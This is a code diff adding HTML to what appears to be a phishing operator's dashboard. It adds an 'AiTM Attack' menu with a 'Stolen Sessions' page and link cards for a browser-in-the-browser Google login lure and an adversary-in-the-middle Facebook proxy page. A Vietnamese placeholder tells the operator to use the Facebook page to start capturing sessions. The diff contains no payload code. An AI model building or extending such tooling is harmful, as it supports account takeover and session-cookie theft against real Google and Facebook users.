@@ -48,6 +48,12 @@
                 <span class="nav-badge" id="navBadgeAnalytics" style="background:var(--green);color:#000">0</span>
             </div>
 
+            <div class="nav-label">AiTM Attack</div>
+            <div class="nav-item" onclick="switchPage('sessions',this);loadStolenSessions()" id="nav-sessions">
+                <span class="nav-icon"><i data-lucide="shield-off"></i></span> Stolen Sessions
+                <span class="nav-badge" id="navBadgeSessions" style="background:#ef4444;color:#fff">0</span>
+            </div>
+
             <div class="nav-label">Tools</div>
             <div class="nav-item" onclick="switchPage('links',this)" id="nav-links">
                 <span class="nav-icon"><i data-lucide="link-2"></i></span> Phishing Links
@@ -202,6 +208,41 @@
                                 <button class="btn-copy" onclick="copyLink('delivLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
                                 <button class="btn-preview" onclick="window.open(document.getElementById('delivLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
                             </div>
+                        </div>
+                        <div class="link-card" style="border-left:3px solid var(--amber)">
+                            <div class="link-header"><i data-lucide="app-window" class="icon-link"></i> BitB Google <span class="link-badge" style="background:rgba(217,119,6,.08);color:var(--amber)">BitB ATTACK</span></div>
+                            <div class="link-url" id="bitbLink">/phishing/bitb-google.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('bitbLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('bitbLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                        <div class="link-card" style="border-left:3px solid #ef4444">
+                            <div class="link-header"><i data-lucide="shield-off" class="icon-link"></i> AiTM Facebook <span class="link-badge" style="background:rgba(239,68,68,.12);color:#ef4444">AiTM PROXY</span></div>
+                            <div class="link-url" id="aitmLink">/phishing/aitm-facebook.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('aitmLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('aitmLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE: STOLEN SESSIONS (AiTM) -->
+            <div class="page" id="page-sessions">
+                <div class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">🍪 Stolen Sessions (AiTM)</h2>
+                        <div class="section-actions">
+                            <button class="btn btn-ghost" onclick="loadStolenSessions()"><i data-lucide="refresh-cw" class="icon-btn"></i> Reload</button>
+                        </div>
+                    </div>
+                    <div id="stolenSessionsList" style="display:grid;gap:12px;">
+                        <div style="text-align:center;padding:40px 20px;color:var(--text-secondary);">
+                            <div style="font-size:48px;margin-bottom:12px;">🔒</div>
+                            <p>Chưa có session nào bị capture.</p>
+                            <p style="font-size:12px;margin-top:8px;">Sử dụng trang <strong>AiTM Facebook</strong> để bắt đầu.</p>
                         </div>
                     </div>
                 </div>
